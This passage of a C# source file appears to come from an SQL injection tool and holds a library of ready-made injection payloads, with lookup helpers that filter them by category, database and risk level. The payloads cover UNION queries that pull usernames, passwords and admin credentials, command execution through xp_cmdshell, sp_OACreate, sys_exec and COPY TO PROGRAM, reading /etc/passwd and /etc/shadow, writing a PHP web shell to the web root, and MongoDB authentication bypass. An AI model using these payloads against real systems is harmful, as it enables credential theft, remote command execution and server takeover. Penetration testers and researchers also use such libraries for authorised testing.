                        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                        "' UNION SELECT column_name,column_type FROM information_schema.columns WHERE table_name='users'--"
                    },
                    ExpectedResult = "Table column information",
                    RiskLevel = 3
                }
            });
        }

        #endregion

        #region Data Extraction Payloads

        private static void InitializeDataExtractionPayloads()
        {
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "User Data Extraction",
                    Category = PayloadCategory.Data_Extraction,
                    Description = "Extract user data from users table",
                    PayloadString = "' UNION SELECT username,password FROM users--",
                    SupportedDatabases = SQLDatabases,
                    Variations = new[]
                    {
                        "' UNION SELECT username,password FROM users WHERE id=1--",
                        "' UNION SELECT username,email FROM users--",
                        "' UNION SELECT id,username FROM users--"
                    },
                    ExpectedResult = "User credentials",
                    RiskLevel = 5
                },
                new Payload
                {
                    Name = "Admin Data Extraction",
                    Category = PayloadCategory.Data_Extraction,
                    Description = "Extract admin user data",
                    PayloadString = "' UNION SELECT username,password FROM users WHERE role='admin'--",
                    SupportedDatabases = SQLDatabases,
                    Variations = new[]
                    {
                        "' UNION SELECT username,password FROM users WHERE username='admin'--",
                        "' UNION SELECT username,password FROM users WHERE id=1--",
                        "' UNION SELECT username,password FROM admin--"
                    },
                    ExpectedResult = "Admin credentials",
                    RiskLevel = 5
                },
                new Payload
                {
                    Name = "Configuration Data",
                    Category = PayloadCategory.Data_Extraction,
                    Description = "Extract configuration data",
                    PayloadString = "' UNION SELECT config_name,config_value FROM config--",
                    SupportedDatabases = SQLDatabases,
                    Variations = new[]
                    {
                        "' UNION SELECT name,value FROM settings--",
                        "' UNION SELECT key,value FROM configuration--",
                        "' UNION SELECT option_name,option_value FROM options--"
                    },
                    ExpectedResult = "Configuration settings",
                    RiskLevel = 4
                }
            });
        }

        #endregion

        #region Command Execution Payloads

        private static void InitializeCommandExecutionPayloads()
        {
            // MSSQL Command Execution
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MSSQL xp_cmdshell",
                    Category = PayloadCategory.Command_Execution,
                    Description = "Execute system commands using xp_cmdshell",
                    PayloadString = "'; EXEC master..xp_cmdshell 'dir'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    Variations = new[]
                    {
                        "'; EXEC master..xp_cmdshell 'whoami'--",
                        "'; EXEC master..xp_cmdshell 'net user'--",
                        "'; EXEC master..xp_cmdshell 'ipconfig'--"
                    },
                    RequiresPrivileges = true,
                    ExpectedResult = "Command execution output",
                    RiskLevel = 5
                },
                new Payload
                {
                    Name = "MSSQL sp_OACreate",
                    Category = PayloadCategory.Command_Execution,
                    Description = "Execute commands using sp_OACreate",
                    PayloadString = "'; DECLARE @result int; EXEC @result = sp_OACreate 'WScript.Shell', @result OUTPUT; EXEC sp_OAMethod @result, 'Run', NULL, 'cmd.exe /c dir'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    RequiresPrivileges = true,
                    ExpectedResult = "Command execution",
                    RiskLevel = 5
                }
            });

            // MySQL Command Execution
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MySQL UDF Command",
                    Category = PayloadCategory.Command_Execution,
                    Description = "Execute commands using User Defined Functions",
                    PayloadString = "'; SELECT sys_exec('whoami')--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    RequiresPrivileges = true,
                    ExpectedResult = "Command execution output",
                    RiskLevel = 5
                }
            });

            // PostgreSQL Command Execution
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "PostgreSQL COPY Command",
                    Category = PayloadCategory.Command_Execution,
                    Description = "Execute commands using COPY FROM PROGRAM",
                    PayloadString = "'; COPY (SELECT 1) TO PROGRAM 'whoami'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.PostgreSQL },
                    RequiresPrivileges = true,
                    ExpectedResult = "Command execution",
                    RiskLevel = 5
                }
            });
        }

        #endregion

        #region File Operation Payloads

        private static void InitializeFileOperationPayloads()
        {
            // MySQL File Operations
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MySQL LOAD_FILE",
                    Category = PayloadCategory.File_Operations,
                    Description = "Read files using LOAD_FILE function",
                    PayloadString = "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' UNION SELECT LOAD_FILE('/etc/shadow'),NULL--",
                        "' UNION SELECT LOAD_FILE('C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts'),NULL--",
                        "' UNION SELECT LOAD_FILE('/var/log/apache2/access.log'),NULL--"
                    },
                    RequiresPrivileges = true,
                    ExpectedResult = "File contents",
                    RiskLevel = 4
                },
                new Payload
                {
                    Name = "MySQL INTO OUTFILE",
                    Category = PayloadCategory.File_Operations,
                    Description = "Write files using INTO OUTFILE",
                    PayloadString = "' UNION SELECT 'shell content',NULL INTO OUTFILE '/tmp/shell.php'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--",
                        "' UNION SELECT 'test content',NULL INTO OUTFILE '/tmp/test.txt'--"
                    },
                    RequiresPrivileges = true,
                    ExpectedResult = "File creation",
                    RiskLevel = 5
                }
            });

            // MSSQL File Operations
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MSSQL BULK INSERT",
                    Category = PayloadCategory.File_Operations,
                    Description = "Read files using BULK INSERT",
                    PayloadString = "'; CREATE TABLE temp_file (content TEXT); BULK INSERT temp_file FROM 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    RequiresPrivileges = true,
                    ExpectedResult = "File contents in table",
                    RiskLevel = 4
                },
                new Payload
                {
                    Name = "MSSQL BCP",
                    Category = PayloadCategory.File_Operations,
                    Description = "Export data using BCP",
                    PayloadString = "'; EXEC master..xp_cmdshell 'bcp \"SELECT * FROM users\" queryout C:\\\\temp\\\\users.txt -c -T'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    RequiresPrivileges = true,
                    ExpectedResult = "File export",
                    RiskLevel = 4
                }
            });

            // PostgreSQL File Operations
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "PostgreSQL COPY FROM",
                    Category = PayloadCategory.File_Operations,
                    Description = "Read files using COPY FROM",
                    PayloadString = "'; CREATE TABLE temp_file (content TEXT); COPY temp_file FROM '/etc/passwd'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.PostgreSQL },
                    RequiresPrivileges = true,
                    ExpectedResult = "File contents in table",
                    RiskLevel = 4
                },
                new Payload
                {
                    Name = "PostgreSQL COPY TO",
                    Category = PayloadCategory.File_Operations,
                    Description = "Write files using COPY TO",
                    PayloadString = "'; COPY (SELECT 'shell content') TO '/tmp/shell.php'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.PostgreSQL },
                    RequiresPrivileges = true,
                    ExpectedResult = "File creation",
                    RiskLevel = 5
                }
            });
        }

        #endregion

        #region Other Payload Categories

        private static void InitializePrivilegeEscalationPayloads()
        {
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MySQL Privilege Check",
                    Category = PayloadCategory.Privilege_Escalation,
                    Description = "Check user privileges",
                    PayloadString = "' UNION SELECT user,host FROM mysql.user WHERE user='root'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    RequiresPrivileges = true,
                    ExpectedResult = "Privilege information",
                    RiskLevel = 3
                }
            });
        }

        private static void InitializeBlindInjectionPayloads()
        {
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "Blind Character Extraction",
                    Category = PayloadCategory.Blind_Injection,
                    Description = "Extract data character by character",
                    PayloadString = "' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' AND ASCII(SUBSTRING((SELECT user()),1,1)) > 64--",
                        "' AND ASCII(SUBSTRING((SELECT version()),1,1)) > 64--"
                    },
                    ExpectedResult = "Boolean response for character extraction",
                    RiskLevel = 2
                }
            });
        }

        private static void InitializeSecondOrderPayloads()
        {
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "Second Order Basic",
                    Category = PayloadCategory.Second_Order,
                    Description = "Second order injection payload",
                    PayloadString = "admin'--",
                    SupportedDatabases = SQLDatabases,
                    RequiresMultipleRequests = true,
                    ExpectedResult = "Injection on subsequent request",
                    RiskLevel = 3
                }
            });
        }

        private static void InitializeNoSQLPayloads()
        {
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MongoDB Authentication Bypass",
                    Category = PayloadCategory.NoSQL_Injection,
                    Description = "MongoDB authentication bypass",
                    PayloadString = "admin'||'1'=='1",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MongoDB },
                    Variations = new[]
                    {
                        "admin'||true||'",
                        "admin'||1||'",
                        "admin'||'1'=='1'||'"
                    },
                    ExpectedResult = "Authentication bypass",
                    RiskLevel = 4
                },
                new Payload
                {
                    Name = "MongoDB JavaScript Injection",
                    Category = PayloadCategory.NoSQL_Injection,
                    Description = "MongoDB JavaScript injection",
                    PayloadString = "'; return true; var dummy='",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MongoDB },
                    Variations = new[]
                    {
                        "'; return this.username == 'admin'; var dummy='",
                        "'; return db.users.find(); var dummy='"
                    },
                    ExpectedResult = "JavaScript code execution",
                    RiskLevel = 4
                }
            });
        }

        private static void InitializeGenericTestPayloads()
        {
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "Single Quote Test",
                    Category = PayloadCategory.Generic_Tests,
                    Description = "Basic single quote test",
                    PayloadString = "'",
                    SupportedDatabases = AllDatabases,
                    ExpectedResult = "Error or different response",
                    RiskLevel = 1
                },
                new Payload
                {
                    Name = "Double Quote Test",
                    Category = PayloadCategory.Generic_Tests,
                    Description = "Basic double quote test",
                    PayloadString = "\"",
                    SupportedDatabases = AllDatabases,
                    ExpectedResult = "Error or different response",
                    RiskLevel = 1
                },
                new Payload
                {
                    Name = "Backslash Test",
                    Category = PayloadCategory.Generic_Tests,
                    Description = "Basic backslash test",
                    PayloadString = "\\",
                    SupportedDatabases = AllDatabases,
                    ExpectedResult = "Error or different response",
                    RiskLevel = 1
                }
            });
        }

        #endregion

        #region Public Methods

        /// <summary>
        /// Get all payloads for a specific category
        /// </summary>
        /// <param name="category">Payload category</param>
        /// <returns>List of payloads</returns>
        public static List<Payload> GetPayloadsByCategory(PayloadCategory category)
        {
            return AllPayloads.Where(p => p.Category == category).ToList();
        }

        /// <summary>
        /// Get all payloads for a specific database
        /// </summary>
        /// <param name="database">Database family</param>
        /// <returns>List of payloads</returns>
        public static List<Payload> GetPayloadsForDatabase(DbTypes.DatabaseFamily database)
        {
            return AllPayloads.Where(p => 
                p.SupportedDatabases.Length == 0 || 
                p.SupportedDatabases.Contains(database)).ToList();
        }

        /// <summary>
        /// Get payloads by category and database
        /// </summary>
        /// <param name="category">Payload category</param>
        /// <param name="database">Database family</param>
        /// <returns>List of payloads</returns>
        public static List<Payload> GetPayloads(PayloadCategory category, DbTypes.DatabaseFamily database)
        {
            return AllPayloads.Where(p => 
                p.Category == category && 
                (p.SupportedDatabases.Length == 0 || p.SupportedDatabases.Contains(database))).ToList();
        }

        /// <summary>
        /// Get payloads by risk level
        /// </summary>
        /// <param name="maxRiskLevel">Maximum risk level</param>
        /// <returns>List of payloads</returns>
        public static List<Payload> GetPayloadsByRiskLevel(int maxRiskLevel)
        {
            return AllPayloads.Where(p => p.RiskLevel <= maxRiskLevel).ToList();
        }

        /// <summary>
        /// Get all payload strings for a category
        /// </summary>
        /// <param name="category">Payload category</param>
        /// <returns>List of payload strings</returns>
        public static List<string> GetPayloadStrings(PayloadCategory category)
        {
            var payloads = GetPayloadsByCategory(category);
            var result = new List<string>();
            
            foreach (var payload in payloads)
            {
                result.Add(payload.PayloadString);
                result.AddRange(payload.Variations);
            }
            
            return result.Distinct().ToList();
        }

        /// <summary>
        /// Add custom payload
        /// </summary>
        /// <param name="payload">Payload to add</param>
        public static void AddCustomPayload(Payload payload)
        {
            AllPayloads.Add(payload);
        }

        /// <summary>
        /// Remove payload by name
        /// </summary>
        /// <param name="name">Payload name</param>
        /// <returns>True if removed</returns>
        public static bool RemovePayload(string name)
        {
            return AllPayloads.RemoveAll(p => p.Name == name) > 0;
        }

        /// <summary>
        /// Get payload by name
        /// </summary>
        /// <param name="name">Payload name</param>
        /// <returns>Payload or null</returns>
        public static Payload GetPayload(string name)
        {
            return AllPayloads.FirstOrDefault(p => p.Name == name);
        }

        /// <summary>
        /// Get all available categories
        /// </summary>
        /// <returns>List of categories</returns>
        public static List<PayloadCategory> GetAllCategories()
        {
            return AllPayloads.Select(p => p.Category).Distinct().ToList();
        }

        /// <summary>
        /// Get payload statistics
        /// </summary>
        /// <returns>Dictionary with category counts</returns>
        public static Dictionary<PayloadCategory, int> GetPayloadStatistics()
        {
            return AllPayloads.GroupBy(p => p.Category)
                             .ToDictionary(g => g.Key, g => g.Count());
        }

        #endregion
    }
}